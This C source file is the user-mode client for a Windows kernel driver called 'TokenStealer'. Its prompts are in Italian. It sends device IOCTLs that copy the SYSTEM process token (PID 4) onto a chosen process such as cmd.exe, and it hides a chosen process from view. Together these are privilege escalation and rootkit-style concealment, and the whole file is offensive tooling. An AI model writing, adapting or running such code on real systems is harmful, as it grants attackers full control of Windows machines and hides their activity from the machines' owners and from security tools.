
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

#define IOCTL_STEAL_TOKEN   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDE_PROCESS  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _PROCESS_IO_INPUT {
    ULONG SourcePid;
    ULONG TargetPid;
} PROCESS_IO_INPUT;

typedef struct _HIDE_PROC_INPUT {
    ULONG PidToHide;
} HIDE_PROC_INPUT;

void StealToken(HANDLE hDevice, ULONG sourcePid, ULONG targetPid)
{
    PROCESS_IO_INPUT input = { 0 };
    DWORD bytesReturned;

    input.SourcePid = sourcePid;
    input.TargetPid = targetPid;

    BOOL ok = DeviceIoControl(
        hDevice,
        IOCTL_STEAL_TOKEN,
        &input,
        sizeof(input),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (ok)
        printf("[+] Token rubato da PID %lu a PID %lu\n", sourcePid, targetPid);
    else
        printf("[-] Errore nel rubare il token (%lu)\n", GetLastError());
}

void HideProcess(HANDLE hDevice, ULONG pidToHide)
{
    HIDE_PROC_INPUT input = { 0 };
    DWORD bytesReturned;

    input.PidToHide = pidToHide;

    BOOL ok = DeviceIoControl(
        hDevice,
        IOCTL_HIDE_PROCESS,
        &input,
        sizeof(input),
        NULL,
        0,
        &bytesReturned,
        NULL
    );

    if (ok)
        printf("[+] Processo PID %lu nascosto con successo\n", pidToHide);
    else
        printf("[-] Errore nel nascondere il processo (%lu)\n", GetLastError());
}

int main()
{
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\TokenStealer",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Impossibile aprire handle al driver (err %lu)\n", GetLastError());
        return 1;
    }

    int choice;
    printf("1) Steal token\n");
    printf("2) Hide process\n");
    printf("Seleziona opzione: ");
    scanf("%d", &choice);

    if (choice == 1) {
        ULONG srcPid = 4;  // PID fisso a 4, non si chiede più
        ULONG tgtPid;
        printf("PID target (es: cmd.exe): ");
        scanf("%lu", &tgtPid);
        StealToken(hDevice, srcPid, tgtPid);
    }
    else if (choice == 2) {
        ULONG pid;
        printf("PID da nascondere: ");
        scanf("%lu", &pid);
        HideProcess(hDevice, pid);
    }
    else {
        printf("Opzione non valida.\n");
    }

    CloseHandle(hDevice);
    return 0;
}
